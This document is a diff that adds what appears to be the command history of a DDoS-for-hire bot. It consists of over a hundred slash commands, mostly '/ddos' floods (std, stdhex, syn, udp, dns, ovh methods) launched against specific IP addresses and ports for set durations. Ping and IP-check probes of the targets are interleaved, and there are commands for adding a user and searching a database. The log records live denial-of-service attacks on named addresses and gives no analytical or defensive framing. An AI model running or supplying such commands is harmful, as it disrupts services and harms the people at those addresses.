@@ -1,0 +1,123 @@
+/help
+/info
+/methods
+/lag
+/ping 1.1.1.1
+/ping 74.137.213.195
+/methods
+/ddos std 52.191.227.6 30 dport=30217
+/ddos std 52.188.136.221 30 dport=30002
+/tr4p
+/ddos std 18.222.24.214 30 dport=9003
+/ddos std 68.47.180.214 60 dport=80
+/ddos std 183.131.168.26 30
+/hi
+/ddos std 74.137.213.195 60 dport=80
+/plan
+/ddos std 128.116.70.26 30 dport=57837
+/ddos std 128.116.70.26 120 dport=57837
+/ddos dns 128.116.70.26 120 dport=57837
+/ddos stdhex 128.116.70.26 120 dport=57837
+/ddos syn 128.116.70.26 120 dport=57837
+/ddos stdhex 128.116.70.26 120 dport=57837
+/methods
+/ddos stdhex 128.116.70.26 120 dport=57837
+/ddos stdhex 128.116.34.219 120 dport=63133
+/ddos std 128.116.34.219 120 dport=63133
+/ddos stdhex 128.116.34.219 120 dport=63133
+/ddos std 128.116.34.219 120 dport=63133
+/ddos stdhex 128.116.34.219 120 dport=63133
+/ddos stdhex 128.116.34.100 120 dport=53441
+/tr4p
+/ddos stdhex 128.116.34.100 120 dport=53441
+/methods
+/ddos std 104.18.58.136 30 dport=80
+/ddos stdhex 68.47.180.214 120 dport=80
+/plan
+/ddos std 52.191.224.51 120 dport=30000
+/ddos stdhex 128.116.43.100 120 dport=52757
+/dbsearch Differinq
+/plan
+/plan
+/ddos stdhex 128.116.35.9 120 dport=49309
+/ddos stdhex 128.116.35.9 120 dport=49309
+/methods
+/ddos std 20.167.206.184 120 dport=2679
+/ddos stdhex 104.18.58.136 120 dport=80
+/ddos std 107.191.99.2 60 dport=80
+/ddos stdhex 128.116.29.84 120 dport=52624
+/ddos stdhex 128.116.29.84 120 dport=52624
+/adddbuser xDiablo 74.137.213.195
+/ddos stdhex 128.116.29.201 120 dport=64162
+/ddos stdhex 128.116.37.85 120 dport=51115
+/ddos stdhex 128.116.70.131 120 dport=51180
+/methods
+/ddos syn 128.116.70.131 120 dport=51180
+/ddos stdhex 128.116.42.224 120 dport=65287
+/ddos stdhex 128.116.42.224 40 dport=65287
+/ddos std 68.47.180.214 120 dport=80
+/ddos stdhex 147.135.31.72 120 dport=80
+/ddos stdhex 128.116.34.223 120 dport=64609
+/ddos stdhex 128.116.34.223 120 dport=64609
+/ddos stdhex 128.116.34.223 120 dport=64609
+/ddos stdhex 128.116.39.148 20 52803
+/ddos stdhex 128.116.39.148 40 dport=52803
+/ddos udpplain 71.176.19.48 120 dport=80
+/ddos stdhex 128.116.27.73 120 dport=56840
+/ddos stdhex 209.206.45.97 120 dport=64571
+/ping 68.47.180.214
+/ddos udpplain 68.47.180.214 120 dport=80
+/ddos std 69.92.63.202 120 dport=80
+/ping 96.250.1.71
+/ddos stdhex 96.250.1.71 200 dport=80
+/ddos stdhex 128.116.45.83 120 dport=54870
+/ddos stdhex 128.116.45.83 120 dport=54870
+/ddos std 66.31.94.147 400 dport=80
+/tr4p
+/checkip 3.15.228.124
+/plans
+/ddos stdhex 128.116.70.46 120 dport=63657
+/ddos stdhex 128.116.70.46 120 dport=63657
+/ddos stdhex 128.116.70.46 120 dport=63657
+/ddos std 96.230.141.33 300 dport=80
+/ping 96.230.141.33
+/ddos stdhex 128.116.42.9 120 dport=53412
+/checkip 51.222.35.215
+/checkip 104.18.58.136
+/ddos stdhex 104.18.58.136 120 dport=80
+/ddos stop cmd?
+/ddos stdhex 128.116.24.20 60 dport=53943
+/ddos stdhex 128.116.24.20 60 dport=53943
+/ddos stdhex 128.116.24.20 60 dport=53943
+/checkip 128.116.42.98
+/ddos stdhex 128.116.42.98 120 dport=58439
+/checkip 51.222.35.215
+/ddos std 51.222.35.215 20 dport=25565
+/methods
+/ddos ovh 51.222.35.215 20 dport=25565
+/plan
+/tr4p
+/methods
+/ddos std 52.142.18.189 120 doirt=30041
+/ddos std 52.142.18.189 120 dport=30041
+/tr4p
+/methods
+/ddos stdhex 128.116.44.157 40 dport=59349
+/checkip 128.116.44.157
+/plans
+/checkip 75.74.92.245
+/ping 75.74.92.245
+/ddos std 75.74.92.245 120 dport=80
+/ping 75.74.92.245
+/ping 75.74.92.245
+/ping 75.74.92.245
+/plan
+/ddos udp 75.74.92.245 400 dport=80
+/ping 75.74.92.245
+/checkip 45.95.168.156
+/ddos std 45.95.168.156 40 dport=80
+/ddos udp 68.47.180.214 60 dport=80
+/ddos udp 128.116.46.218 40 dport=61585
+/ddos stdhex 128.116.46.218 120 dport=61585
+/checkip 45.95.168.184
+/ddos stdhex 128.116.39.213 120 dport=49184
